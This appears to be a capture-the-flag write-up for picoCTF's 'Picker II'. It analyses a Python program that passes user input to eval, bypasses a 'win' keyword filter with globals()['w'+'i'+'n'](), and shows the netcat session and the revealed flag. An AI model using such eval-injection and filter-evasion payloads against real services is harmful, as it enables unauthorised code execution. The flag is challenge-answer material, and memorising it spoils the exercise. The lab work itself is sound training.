**Challenge**
	
**Description**
	Can you figure out how this program works to get the flag?
	Connect to the program with netcat:`$ nc saturn.picoctf.net 63786`
	The program's source code can be downloaded [here](https://artifacts.picoctf.net/c/521/picker-II.py).
	**Hints**
		1. Can you do what `win` does with your input to the program?

**Solution**
	1. Download the `picker-II.py` file and analyze it.
	2. Notice this important line: `eval(user_input + '()')`, so the program executes any function name you input.
	3. There is also a filter:
		<script>
			if 'win' in user_input:
				return False
		</script>
		- You cannot directly type `win`.
	4. There is a useful function:
		<script>
			def win():
			    flag = open('flag.txt', 'r').read()
		</script>
		- This prints the flag in hexadecimal format.
	5. The goal is to execute `win()` **without typing "win" directly**.
	6. We can use Python introspection with `globals()`:
		<script> globals() </script>
	7. Then access `win` by building the string dynamically:
		`globals()['w'+'i'+'n']()`
		<script class = 'kali'>
			┌──(kali㉿kali)-[~]
			└─$ nc saturn.picoctf.net 63786
			==> globals()['w'+'i'+'n']()
			0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x66 0x31 0x6c 0x37 0x33 0x72 0x35 0x5f 0x66 0x34 0x31 0x6c 0x5f 0x63 0x30 0x64 0x33 0x5f 0x72 0x33 0x66 0x34 0x63 0x37 0x30 0x72 0x5f 0x6d 0x31 0x67 0x68 0x37 0x5f 0x35 0x75 0x63 0x63 0x33 0x33 0x64 0x5f 0x62 0x39 0x32 0x34 0x65 0x38 0x65 0x35 0x7d 
			'NoneType' object is not callable
																								
			┌──(kali㉿kali)-[~]
			└─$ 
		</script>		
	8. Now we decode the hex format into ASCII with the code [[Files 03/solveHex.py]].
	9. Flag: `picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_b924e8e5}`.

**Notes**
	

**References**
	